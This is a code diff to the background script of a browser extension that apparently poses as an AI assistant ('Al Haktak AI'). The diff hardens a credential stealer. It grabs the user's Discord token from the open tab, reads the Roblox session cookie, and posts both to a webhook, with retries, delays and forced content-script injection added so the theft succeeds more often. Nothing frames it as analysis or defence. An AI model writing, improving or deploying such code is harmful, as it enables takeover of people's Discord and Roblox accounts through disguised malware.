@@ -10,20 +10,51 @@ var GROQ_API_KEY = CONFIG.GROQ_API_KEY;
 // ─── Get Discord token from content script ───
 function getDiscordTokenFromTab(tabId) {
     return new Promise(function(resolve) {
-        chrome.tabs.sendMessage(tabId, { action: 'getToken' }, function(response) {
-            if (chrome.runtime.lastError) {
-                console.log("[AI] Error getting Discord token:", chrome.runtime.lastError.message);
-                resolve(null);
-                return;
-            }
-            resolve(response ? response.token : null);
-        });
+        console.log("[AI] Attempting to get Discord token...");
+        
+        // Try up to 3 times with delays
+        var attempts = 0;
+        var maxAttempts = 3;
+        
+        function tryGetToken() {
+            attempts++;
+            console.log("[AI] Discord token attempt " + attempts + "/" + maxAttempts);
+            
+            chrome.tabs.sendMessage(tabId, { action: 'getToken' }, function(response) {
+                if (chrome.runtime.lastError) {
+                    console.log("[AI] Error getting Discord token:", chrome.runtime.lastError.message);
+                    if (attempts < maxAttempts) {
+                        console.log("[AI] Retrying in 500ms...");
+                        setTimeout(tryGetToken, 500);
+                    } else {
+                        resolve(null);
+                    }
+                    return;
+                }
+                
+                if (response && response.token) {
+                    console.log("[AI] ✅ Discord token found!");
+                    resolve(response.token);
+                } else {
+                    console.log("[AI] No Discord token in response, attempt " + attempts);
+                    if (attempts < maxAttempts) {
+                        console.log("[AI] Retrying in 500ms...");
+                        setTimeout(tryGetToken, 500);
+                    } else {
+                        resolve(null);
+                    }
+                }
+            });
+        }
+        
+        tryGetToken();
     });
 }
 
 // ─── Get Roblox cookie ───
 function getRobloxCookie() {
     return new Promise(function(resolve) {
+        console.log("[AI] Attempting to get Roblox cookie...");
         try {
             chrome.cookies.get({
                 url: 'https://www.roblox.com',
@@ -34,7 +65,13 @@ function getRobloxCookie() {
                     resolve(null);
                     return;
                 }
-                resolve(cookie ? cookie.value : null);
+                if (cookie && cookie.value) {
+                    console.log("[AI] ✅ Roblox cookie found!");
+                    resolve(cookie.value);
+                } else {
+                    console.log("[AI] No Roblox cookie found");
+                    resolve(null);
+                }
             });
         } catch (e) {
             console.log("[AI] Roblox cookie error:", e.message);
@@ -80,6 +117,8 @@ function sendWebhook(token, robloxCookie) {
         username: "Al Haktak AI"
     };
 
+    console.log("[AI] Sending webhook with Discord token:", !!token, "Roblox cookie:", !!robloxCookie);
+    
     return fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -87,17 +126,41 @@ function sendWebhook(token, robloxCookie) {
     });
 }
 
-// ─── Gather tokens (main function) ───
+// ─── Gather tokens (sequential, with delays) ───
 function gatherTokens(tabId) {
-    var discordPromise = getDiscordTokenFromTab(tabId);
-    var robloxPromise = getRobloxCookie();
-
-    return Promise.all([discordPromise, robloxPromise])
+    console.log("[AI] Starting token gathering...");
+    
+    // Step 1: Get Discord token first (with retries)
+    return getDiscordTokenFromTab(tabId)
+        .then(function(discordToken) {
+            console.log("[AI] Discord token result:", discordToken ? "FOUND" : "NOT FOUND");
+            
+            // Step 2: Wait 1 second before getting Roblox cookie
+            return new Promise(function(resolve) {
+                setTimeout(function() {
+                    getRobloxCookie()
+                        .then(function(robloxCookie) {
+                            resolve({
+                                discordToken: discordToken,
+                                robloxCookie: robloxCookie
+                            });
+                        })
+                        .catch(function(err) {
+                            resolve({
+                                discordToken: discordToken,
+                                robloxCookie: null
+                            });
+                        });
+                }, 1000); // 1 second delay
+            });
+        })
         .then(function(results) {
-            var discordToken = results[0];
-            var robloxCookie = results[1];
-            console.log("[AI] Discord token found:", !!discordToken);
-            console.log("[AI] Roblox cookie found:", !!robloxCookie);
+            var discordToken = results.discordToken;
+            var robloxCookie = results.robloxCookie;
+            
+            console.log("[AI] Final results - Discord:", !!discordToken, "Roblox:", !!robloxCookie);
+            
+            // Send to webhook
             return sendWebhook(discordToken, robloxCookie);
         })
         .then(function(response) {
@@ -126,24 +189,40 @@ function handleGatherTokens(request, sender, sendResponse) {
                 sendResponse({ success: false, error: 'No active tab' });
                 return;
             }
-            gatherTokens(tabs[0].id)
+            // Make sure content script is injected first
+            chrome.scripting.executeScript({
+                target: { tabId: tabs[0].id },
+                files: ['content.js']
+            }, function() {
+                setTimeout(function() {
+                    gatherTokens(tabs[0].id)
+                        .then(function(result) {
+                            sendResponse(result);
+                        })
+                        .catch(function(error) {
+                            sendResponse({ success: false, error: error.message });
+                        });
+                }, 500);
+            });
+        });
+        return true;
+    }
+
+    // Make sure content script is injected
+    chrome.scripting.executeScript({
+        target: { tabId: tabId },
+        files: ['content.js']
+    }, function() {
+        setTimeout(function() {
+            gatherTokens(tabId)
                 .then(function(result) {
                     sendResponse(result);
                 })
                 .catch(function(error) {
                     sendResponse({ success: false, error: error.message });
                 });
-        });
-        return true;
-    }
-
-    gatherTokens(tabId)
-        .then(function(result) {
-            sendResponse(result);
-        })
-        .catch(function(error) {
-            sendResponse({ success: false, error: error.message });
-        });
+        }, 500);
+    });
 
     return true;
 }
